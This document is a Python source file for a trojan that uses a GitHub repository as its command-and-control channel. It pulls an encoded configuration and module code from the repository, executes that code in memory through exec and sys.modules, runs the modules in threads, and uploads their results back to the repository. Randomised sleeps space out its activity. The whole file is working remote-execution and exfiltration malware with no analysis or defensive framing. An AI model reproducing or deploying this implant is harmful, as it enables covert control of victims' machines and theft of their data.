import json
import base64
import sys
import imp
import time

from random import randint
from threading import Thread
from queue import Queue
from github3 import login

class Foo():

    def __init__(self):
        """Initialize object"""
        self.id     = "000"       # id
        self.config_json = None
        self.task_queue = Queue() # Queue of tasks to perform
        
        self.current_module_code = ""
    
    def connect_to_github(self):
        "Connect to github"
        
        self.gh = login(username="yourusername", password="yourpassword")
        self.repo = self.gh.repository("yourusername", "yourrepository")
        self.branch = self.repo.branch("master")

# configure start

    def get_file_contents(self, filepath):
        """Return the encoded contents of filepath"""
        
        self.connect_to_github()
        tree = self.branch.commit.commit.tree.to_tree().recurse()

        for filename in tree.tree:
            if filepath in filename.path:
                print("[*] Found %s" % filepath)
                blob = self.repo.blob(filename._json_data['sha'])   # get file from hash number
                return blob.content
        return None

    def find_module(self, fullname, path=None):
        """Retrive module code from repository"""

        print("[*] Attempting to retrive %s" % fullname)
        new_library = self.get_file_contents("modules/%s" % fullname)

        if new_library is not None: # get the code of the module
            self.current_module_code = base64.b64decode(new_library)
            return self
        return None

    def load_module(self, name):
        """Load module to sys.modules"""
        self.find_module(name)      # get module code

        module = imp.new_module(name)
        exec(self.current_module_code, module.__dict__) # add module code
        sys.modules[name] = module

        return module

    def configure(self):
        """Load the modules from config_file"""
        
        config_file = f"{self.id}.json"
        config_json = self.get_file_contents(config_file)
        self.config_json = json.loads(base64.b64decode(config_json))  # get config dict

        for task in self.config_json:
            if task['module'] not in sys.modules:
                self.load_module(task['module'])
                exec(f"import {task['module']}")

# configure end

    def store_module_result(self, result, module_name):
        """Push result to github"""
        self.connect_to_github()
        data_path = f"data/{self.id}/{round(time.time())}.data"
        self.repo.create_file(data_path, module_name, base64.b64encode(result.encode()))

    def module_runner(self, module):
        """Run the module code"""
        self.task_queue.put(1)
        result = sys.modules[module].run()

        self.store_module_result(result, module)

def main(argc, argv):
    troj = Foo()

    while True:
        if troj.task_queue.empty():
            troj.configure()

        for task in troj.config_json:
            Thread(target=troj.module_runner, args=(task['module'],)).start()
            time.sleep(randint(1, 10))
        time.sleep(randint(1000, 10000))

if __name__ == '__main__':
    main(len(sys.argv), sys.argv)